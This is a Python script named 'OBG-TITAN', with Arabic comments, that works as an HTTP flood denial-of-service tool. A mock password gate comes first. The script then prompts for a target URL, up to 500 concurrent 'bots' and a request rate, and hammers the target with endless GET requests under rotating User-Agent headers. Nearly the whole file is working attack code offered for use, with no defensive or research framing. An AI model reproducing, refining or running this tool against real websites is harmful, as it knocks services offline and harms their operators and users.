import asyncio
import aiohttp
import hashlib
import getpass
import sys
import random
import time
import os
from colorama import Fore, Style, init

# تهيئة الألوان
init(autoreset=True)

# --- كلاس الحماية (مستوى أمني عالي) ---
class SecurityModule:
    @staticmethod
    def verify_access():
        print(Fore.CYAN + "==========================================")
        print(Fore.CYAN + "      [ OBG-TITAN SECURE GATEWAY ]      ")
        print(Fore.CYAN + "==========================================")
        password = getpass.getpass(Fore.YELLOW + "Enter Access Key: ")
        # كلمة المرور المطلوبة هي 123
        if password == "123":
            return True
        return False

# --- كلاس إدارة الهجوم ---
class AttackEngine:
    def __init__(self, target, bots, speed):
        self.target = target
        self.bots = min(bots, 500) # تحديد الحد الأقصى 500
        self.speed = speed
        self.stats = 0
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) Chrome/91.0.4472.124",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36"
        ]

    async def single_bot_attack(self, session, bot_id):
        while True:
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                async with session.get(self.target, headers=headers, timeout=5) as resp:
                    self.stats += 1
                    # طباعة تحديث لحظي (اختياري للسرعة)
                    if self.stats % 100 == 0:
                        print(f"[*] Bot {bot_id} sent request. Total: {self.stats}")
            except:
                pass
            await asyncio.sleep(1 / self.speed)

    async def start(self):
        print(Fore.GREEN + f"[*] Launching {self.bots} bots against {self.target}...")
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=None)) as session:
            tasks = [self.single_bot_attack(session, i) for i in range(self.bots)]
            await asyncio.gather(*tasks)

# --- الدالة الرئيسية ---
def main():
    if not SecurityModule.verify_access():
        print(Fore.RED + "[-] Access Denied. Integrity compromised.")
        sys.exit()

    print(Fore.GREEN + "[+] Access Granted. Welcome to OBG-TITAN.")
    
    target = input(Fore.WHITE + "Enter Target URL (e.g., https://example.com): ")
    try:
        bots = int(input(Fore.WHITE + "Number of bots (Max 500): "))
        if bots > 500: bots = 500
        speed = float(input(Fore.WHITE + "Requests per second per bot: "))
    except ValueError:
        print(Fore.RED + "[-] Invalid input.")
        sys.exit()

    engine = AttackEngine(target, bots, speed)
    
    try:
        asyncio.run(engine.start())
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Attack halted by user.")

if __name__ == "__main__":
    main()
